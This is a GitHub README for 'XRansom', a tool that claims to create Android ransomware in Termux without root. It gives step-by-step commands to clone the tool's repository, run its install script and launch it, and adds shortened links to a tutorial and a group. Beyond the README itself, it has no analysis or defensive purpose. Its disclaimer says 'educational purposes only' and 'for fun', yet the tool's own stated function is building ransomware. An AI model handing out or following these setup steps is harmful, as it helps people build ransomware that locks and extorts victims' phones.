# xransom

#### XRansom (Create Android Ransomware In Termux (NO ROOT)
![PicsArt_22-06-02_16-00-46-198](https://user-images.githubusercontent.com/70594016/171613620-0e1c1f3b-889b-447a-94b8-d317b24598b2.png)

### <p align="center">Commands to run tool in ur terminal
***

       Tutorial Link:- https://bit.ly/3GOXLtC
```bash
Note : Tool is Made of Educational Purposes only.
       Please try not to harm anyone device 
       it's For Fun Purpose Not For Revenge
       (Join Us https://bit.ly/3MdkT66 )
       
```
```bash
pkg update && pkg upgrade -y
```
```bash
pkg install python3 -y
```
```bash
git clone https://github.com/hackerxphantom/xransom
```
```bash
cd xransom
```
```bash
bash install.sh
```
```bash
python3 xransom.py
```
# ScreenShots
![Screenshot_20220602-140652_zoom](https://user-images.githubusercontent.com/70594016/171613525-92e3317d-9440-4d40-8843-c02c4439863c.png)
![Screenshot_20220602-142919_One UI Home](https://user-images.githubusercontent.com/70594016/171613534-bdf0ac5a-450e-4cb4-8b38-8e36a344c69d.png)
     
##### <p align="center">```And Thanks for choosing this tool Support Us !```
